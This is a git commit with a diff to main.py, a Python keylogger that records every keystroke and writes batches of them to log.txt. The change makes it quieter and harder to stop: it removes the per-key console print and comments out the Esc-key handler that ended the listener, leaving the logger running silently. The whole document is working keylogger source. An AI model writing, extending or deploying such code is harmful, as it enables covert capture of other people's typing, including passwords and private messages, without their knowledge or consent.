9b0ca1e22c4522e172766d0fc61998ebe3dabd50
Mustafa Anas <khmostafa4@gmail.com>
2019-12-01 22:48:47 -0500

    no frequesnt new lines

--- main.py
+++ main.py
@@ -8,24 +8,24 @@ def on_press(e):
     global keys, count
     keys.append(e)
     count += 1
-    print('{0} pressed '.format(e))
     if count >= 10:
         count = 0
         write_file(keys)
         keys = []
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open("log.txt", "w+") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                    f.write('\n')
+                    f.write('  ')
             elif k.find("Key") == -1:
                     f.write(k)
-                    
-def on_release(e):
-    if e == Key.esc:
-        return False
 
-with Listener(on_press = on_press, on_release = on_release) as listener:
+# Uncomment the function below to activate stopping the script when pressing Esc Key                    
+#def on_release(e):
+#    if e == Key.esc:
+#        return False
+
+with Listener(on_press = on_press) as listener:
     listener.join()
